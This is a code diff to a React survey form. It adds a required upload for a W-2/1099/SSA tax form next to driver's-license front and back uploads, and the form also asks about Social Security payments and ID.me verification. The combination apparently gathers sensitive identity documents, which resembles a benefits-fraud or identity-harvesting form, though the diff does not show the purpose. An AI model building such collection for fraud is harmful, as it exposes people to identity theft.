@@ -19,6 +19,7 @@ const initialState = {
   HaveYouAppliedBefore: "",
   AreYouCurrentlyRecievingSocialSecurityPayment: "",
   "HaveYouBeenVerifiedBy ID.ME": "",
+  W21099SSAFORM: null as File | null,
   DriverLicenseFront: null as File | null,
   DriverLicenseBack: null as File | null,
 };
@@ -111,7 +112,7 @@ export default function SurveyForm() {
           {Object.entries(initialState).map(([key, _], index) => (
             <div key={key}>
               <label htmlFor={key} className="block text-xl mb-2">
-                {index + 1}. {key.replace(/([A-Z])/g, " $1").trim()}
+                {index + 1}. {key === "W21099SSAFORM" ? "W2 1099 SSA FORM" : key.replace(/([A-Z])/g, " $1").trim()}
               </label>
               {key === "Gender" ? (
                 <div className="flex space-x-4">
@@ -122,7 +123,7 @@ export default function SurveyForm() {
                     <input type="radio" name="Gender" value="Female" onChange={handleInputChange} className="mr-2" required /> Female
                   </label>
                 </div>
-              ) : key.includes("License") ? (
+              ) : key.includes("License") || key === "W21099SSAFORM" ? (
                 <input id={key} name={key} type="file" accept="image/*" onChange={handleInputChange} className="w-full p-2 border border-gray-300 rounded" required />
               ) : (
                 <input id={key} name={key} type={key === "Email" ? "email" : "text"} onChange={handleInputChange} className="w-full p-2 border-b-2 border-gray-400 outline-none focus:border-blue-500 transition" required />
